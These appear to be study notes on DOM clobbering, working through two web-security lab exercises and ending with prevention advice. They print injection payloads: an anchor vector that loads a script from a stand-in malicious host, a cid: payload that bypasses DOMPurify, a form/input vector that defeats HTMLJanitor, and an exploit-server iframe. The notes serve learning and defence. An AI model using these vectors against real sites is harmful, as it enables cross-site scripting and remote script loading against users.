# What is DOM clobbering?
- DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. 
- DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. 
- The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.
- The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. 
- For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form's actual submit() function.

# How to exploit DOM-clobbering vulnerabilities
- A common pattern used by JavaScript developers is:
```
var someObject = window.someObject || {};
```
- If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. 
- Consider the following code:
```
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```
- To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:
```
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
- As the two anchors use the same ID, the DOM groups them together in a DOM collection. 
- The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script.

# Lab: Exploiting DOM clobbering to enable XSS
- This lab contains a DOM-clobbering vulnerability. 
- The comment functionality allows "safe" HTML. 
- To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.
## Steps to solve the lab
- Browse through the app
- Look for Js files that has the could have sinks
- search for sinks in the JS you find
- So I found a variable called the defaultAvatar
- Constructing a comment like this
```
<a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href="cid:&quot;onerror=alert(1)//">
```
# Note
- Always read Javascript files
- The page for a specific blog post imports the JavaScript file loadCommentsWithDomClobbering.js, which contains the following code:
```
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
```
- The defaultAvatar object is implemented using this dangerous pattern containing the logical OR operator in conjunction with a global variable. 
- This makes it vulnerable to DOM clobbering.
- You can clobber this object using anchor tags. 
- Creating two anchors with the same ID causes them to be grouped in a DOM collection. 
- The name attribute in the second anchor contains the value "avatar", which will clobber the avatar property with the contents of the href attribute.
- Notice that the site uses the DOMPurify filter in an attempt to reduce DOM-based vulnerabilities. 
- However, DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes. 
- This means you can inject an encoded double-quote that will be decoded at runtime. 
- As a result, the injection described above will cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} the next time the page is loaded.

- When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the onerror event handler and triggers the alert().

# Second Technique
- Another common technique is to use a form element along with an element such as input to clobber DOM properties. 
- For example, clobbering the attributes property enables you to bypass client-side filters that use it in their logic. 
- Although the filter will enumerate the attributes property, it will not actually remove any attributes because the property has been clobbered with a DOM node. 
- As a result, you will be able to inject malicious attributes that would normally be filtered out. 
- For example, consider the following injection:
```
<form onclick=alert(1)><input id=attributes>Click me
```
- In this case, the client-side filter would traverse the DOM and encounter a whitelisted form element. 
- Normally, the filter would loop through the attributes property of the form element and remove any blacklisted attributes. 
- However, because the attributes property has been clobbered with the input element, the filter loops through the input element instead. - As the input element has an undefined length, the conditions for the for loop of the filter (for example ```i<element.attributes.length)``` are not met, and the filter simply moves on to the next element instead. 
- This results in the onclick event being ignored altogether by the filter, which subsequently allows the alert() function to be called in the browser.

# Lab: Clobbering DOM attributes to bypass HTML filters
- This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. 
- To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. 
- You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.

# Solution
- Go to one of the blog posts and create a comment containing the following HTML:
```
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```
- Go to the exploit server and add the following iframe to the body:
```
<iframe src="https://0a7d005f040e15268022da1d00fc0034.web-security-academy.net/post?postId=8" onload="setTimeout(()=>this.src=this.src+'#x',500)">
```
- Remember to change the URL to contain your lab ID and make sure that the postId parameter matches the postId of the blog post into which you injected the HTML in the previous step.

# Explanation
- The library uses the attributes property to filter HTML attributes. 
- However, it is still possible to clobber the attributes property itself, causing the length to be undefined. 
- This allows us to inject any attributes we want into the form element. 
- In this case, we use the onfocus attribute to smuggle the print() function.
- When the iframe is loaded, after a 500ms delay, it adds the #x fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. 
- This causes the browser to focus on the element with the ID "x", which is the form we created inside the comment. 
- The onfocus event handler then calls the print() function.

# How to prevent DOM-clobbering attacks
- In the simplest terms, you can prevent DOM-clobbering attacks by implementing checks to make sure that objects or functions are what you expect them to be. 
- For instance, you can check that the attributes property of a DOM node is actually an instance of NamedNodeMap. 
- This ensures that the property is an attributes property and not a clobbered HTML element.
- You should also avoid writing code that references a global variable in conjunction with the logical OR operator ||, as this can lead to DOM clobbering vulnerabilities.

# In summary:
- Check that objects and functions are legitimate. 
- If you are filtering the DOM, make sure you check that the object or function is not a DOM node.
- Avoid bad code patterns. 
- Using global variables in conjunction with the logical OR operator should be avoided.
- Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.